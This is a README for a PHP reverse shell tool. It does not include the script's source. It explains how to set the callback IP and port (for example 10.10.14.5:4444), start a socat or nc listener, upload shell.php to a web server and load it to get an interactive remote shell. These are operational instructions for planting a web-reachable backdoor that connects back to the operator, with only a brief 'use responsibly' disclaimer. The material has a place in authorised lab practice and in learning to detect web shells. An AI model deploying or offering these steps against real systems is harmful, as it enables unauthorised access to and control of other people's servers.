# PHP Reverse Shell

This is an easy-to-use PHP script that helps you get a command-line interface (a "shell") on a remote computer.


## What It Does

* **Full Control:** Gives you a real command-line on the remote computer, so you can type commands just like you normally would.
* **Smart Setup:** It handles all the complex parts of getting the shell to work correctly in your terminal.
* **Works Reliably:** It tries different ways to run commands, so it's more likely to work on various systems.
* **Quick to Use:** Designed for fast setup and deployment.

## What You Need

* **On the Remote Computer:**
    * PHP installed.
    * The `proc_open()` function **must be turned on** in PHP's settings (`php.ini`). This is essential for the script to work.
* **On Your Computer:**
    * A program like `netcat` (`nc`) or `socat` to "listen" for the connection.


## How to Use It

1.  **Change the Script:**
    Open the PHP script (you can name it `shell.php`) and find the line at the very bottom that looks like this:

    ```php
    InitShell('IP', PORT);
    ```
    Replace `'IP'` with your computer's IP address and `'PORT'` with a port number you choose (e.g., `4444`).

    *Example: `InitShell('10.10.14.5', 4444);`*

2.  **Start Listening:**
    On your computer, open a terminal (command prompt) and start your listener:

    ```bash
    # Best option
    socat file:`tty`,raw,echo=0 tcp-listen:PORT

    # A simpler option if socat isn't available
    nc -lvnp PORT
    ```

3.  **Run It on the Remote Computer:**
    Upload your modified `shell.php` script to the remote computer.
    **If it's on a website:** Just visit it's web address in a browser (e.g., `http://example-site.com/shell.php`).

4.  **You're Connected!**
    Your listener should show a new connection, and you'll have a working command-line from the remote computer.



## CAUTION!

* **Use Responsibly:** This tool is for learning and testing **only**. Never use it on computers you don't own or don't have permission to access. Doing so is illegal.
* **`proc_open()` is a Must:** If the shell doesn't connect, the most common reason is that the `proc_open()` function is turned off in the remote computer's PHP settings.


## Credits

* **Written by:** santeri@bittisilta.fi
* **Website:** [https://bittisilta.fi](https://bittisilta.fi)
* **TryHackMe:** [https://tryhackme.com/p/santeri1337](https://tryhackme.com/p/santeri1337) [![TryHackMe Badge](https://tryhackme-badges.s3.amazonaws.com/santeri1337.png)](https://tryhackme.com/p/santeri1337)

* **GitHub:** [https://github.com/santeri1337](https://github.com/santeri1337)
